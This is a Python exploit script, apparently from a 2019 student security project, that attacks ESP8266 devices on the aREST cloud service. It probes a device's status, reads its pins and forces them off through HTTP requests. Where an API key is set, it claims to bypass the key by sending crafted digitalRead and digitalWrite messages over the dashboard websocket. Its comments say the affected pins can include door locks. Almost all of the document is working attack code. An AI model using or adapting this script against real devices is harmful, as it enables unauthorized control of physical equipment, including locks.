# Author: Benjamin Schafer
# Date: 3/22/2019
# Written As Part Of CNA 473 Final Project
#
# This Script Is Capable Of Disabling All Pins On An ESP8266 MicroController
# That Is Running The AREST Cloud Framework And Through Said Pins Enabling/Disabled
# Devices (Including Locking Mechanisms!) Connected To Said Pins Depending on
# Whether The Attached Device is Active High Or Active Low
#
# AREST Can Operate With or Without API Key's In The MicroController Code.
# While An API Key Is Supposed To Secure Your Usage Of The AREST Framework
# I Found An Exploit In Which You Can Operate The Controller Without Knowing
# The API Key, Should It Be Enabled
#
# This Script Will Check To See If A Known MicroController By Username Is Online
# Or Not And Also Checks To See If The Controller Is Using An API Key or Not
#
# If A MicroController Is Not Secured With An API Key, The Pins Will Be Enabled
# Using HTTP GET Requests If A MicroController Is Secured With An API Key, The Pins
# Will Be Enabled By Interacting Directly With The Dashboards Websockets


import requests
import sys
from websocket import create_connection

AREST_URI = "https://cloud.arest.io/"
USER = 'CNA473/'
DIGITAL = 'digital/'
DISABLE = '/0'
PIN_NO = 0
USER_URI = AREST_URI + USER
STATUS_URI = AREST_URI + USER + DIGITAL + str(PIN_NO)
PIN_STATUS = [False] * 19

print("You Are Targeting The Following URI: " + USER_URI + " Is That Okay? Y/N")
OK = input()

if OK == 'n' or OK == 'N':
     sys.exit()

else:
    r = requests.get(USER_URI)
    RETURN_MESSAGE = r.content

    if RETURN_MESSAGE.decode('utf-8')[56] != 'f' and RETURN_MESSAGE.decode('utf-8')[56] != 'e':
        print("\nThe Target Is Online And Ready For Exploitation Without An API KEY\n")

        index = 0
        while index < len(PIN_STATUS):
            print("Testing Pin " + str(PIN_NO))
            r = requests.get(STATUS_URI)
            RETURN_MESSAGE = r.content
            if RETURN_MESSAGE.decode('utf-8')[16] == "0":
                PIN_STATUS[index] = True
            PIN_NO = PIN_NO + 1
            STATUS_URI = AREST_URI + USER + DIGITAL + str(PIN_NO)
            index = index + 1

        print("\n")

        index = 0
        while index < len(PIN_STATUS):
             if PIN_STATUS[index] == True:
                 print( "Pin " + str(index) + " Is Already Disabled, This Pin Will Be Skipped")
             else:
                 print("Pin " + str(index) + " Is Marked To Be Disabled")
             index = index + 1

        print("\n")

        PIN_NO = 0
        index = 0
        TARGET_URI = AREST_URI + USER + DIGITAL + str(PIN_NO) + DISABLE
        while index < len(PIN_STATUS):
            if PIN_STATUS[index] == False:
                r = requests.get(TARGET_URI)
                print("Disabling Pin " + str(index))
            index = index + 1
            PIN_NO = PIN_NO + 1
            TARGET_URI = AREST_URI + USER + DIGITAL + str(PIN_NO) + DISABLE

    else:
        print("\nThe Target " + USER_URI + " Is Offline Or Is Using An API Key")

        print("\nTesting Whether The Device Is Using An API Key Or Is Offline")

        WEB_SOCKET_URI = "wss://dashboard.arest.io/sockjs/961/z3ov7i9k/websocket"
        USER = USER[:6]
        PIN_NO = 0

        # connection message without escape characters: ["{\"msg\":\"connect\",\"version\":\"1\",\"support\":[\"1\",\"pre2\",\"pre1\"]}"]
        CONNECTION_MESSAGE = '[\"{\\\"msg\\\":\\\"connect\\\",\\\"version\\\":\\\"1\\\",\\\"support\\\":[\\\"1\\\",\\\"pre2\\\",\\\"pre1\\\"]}"]'
        # example status message for pin 4 without escape characters: ["{\"msg\":\"method\",\"method\":\"digitalRead\",\"params\":[\"272925\",4],\"id\":\"0\"}"]
        PIN_STATUS_MESSAGE = '[\"{\\\"msg\\\":\\\"method\\\",\\\"method\\\":\\\"digitalRead\\\",\\\"params\\\":[\\\"' + USER + '\\\",' + str(PIN_NO) + '],\\\"id\\\":\\\"0\\\"}"]'
        # example disable message for pin 4 without escape characters: ["{\"msg\":\"method\",\"method\":\"digitalWrite\",\"params\":[\"272925\",4,0],\"id\":\"0\"}"]
        DISABLE_MESSAGE = '[\"{\\\"msg\\\":\\\"method\\\",\\\"method\\\":\\\"digitalWrite\\\",\\\"params\\\":[\\\"' + USER + '\\\",' + str(PIN_NO) + ',0],\\\"id\\\":\\\"0\\\"}"]'

        ws = create_connection(WEB_SOCKET_URI)
        result = ws.recv()
        result = ws.recv()
        ws.send(CONNECTION_MESSAGE)
        result = ws.recv()
        ws.send(PIN_STATUS_MESSAGE)
        result = ws.recv()
        result = ws.recv()
        ws.close()
        if result[35] == ',':
            print("\nThe Device Is Online And Using An API Key\n")
            print("Bypassing API Key By Attacking Websockets Directly\n")

            index = 0
            while index < len(PIN_STATUS):
                print("Testing Pin " + str(PIN_NO))
                ws = create_connection(WEB_SOCKET_URI)
                result = ws.recv()
                result = ws.recv()
                ws.send(CONNECTION_MESSAGE)
                result = ws.recv()
                ws.send(PIN_STATUS_MESSAGE)
                result = ws.recv()
                result = ws.recv()
                if result[65] == '0':
                    PIN_STATUS[index] = True
                ws.close()
                PIN_NO = PIN_NO + 1
                index = index + 1
                PIN_STATUS_MESSAGE = '[\"{\\\"msg\\\":\\\"method\\\",\\\"method\\\":\\\"digitalRead\\\",\\\"params\\\":[\\\"' + USER + '\\\",' + str(
                    PIN_NO) + '],\\\"id\\\":\\\"0\\\"}"]'

            print('\n')

            index = 0
            while index < len(PIN_STATUS):
                if PIN_STATUS[index] == True:
                    print("Pin " + str(index) + " Is Already Disabled, This Pin Will Be Skipped")
                else:
                    print("Pin " + str(index) + " Is Marked To Be Disabled")
                index = index + 1

            print('\n')

            PIN_NO = 0
            index = 0
            while index < len(PIN_STATUS):
                if PIN_STATUS[index] == False:
                    ws = create_connection(WEB_SOCKET_URI)
                    result = ws.recv()
                    result = ws.recv()
                    ws.send(CONNECTION_MESSAGE)
                    result = ws.recv()
                    ws.send(DISABLE_MESSAGE)
                    result = ws.recv()
                    result = ws.recv()
                    ws.close()
                    print("Disabling Pin " + str(index))
                PIN_NO = PIN_NO + 1
                index = index + 1
                DISABLE_MESSAGE = '[\"{\\\"msg\\\":\\\"method\\\",\\\"method\\\":\\\"digitalWrite\\\",\\\"params\\\":[\\\"' + USER + '\\\",' + str(PIN_NO) + ',0],\\\"id\\\":\\\"0\\\"}"]'
        else:
            print("\nThe Device Is Offline, It Is Impossible To Determine If It Is Using An API Key")



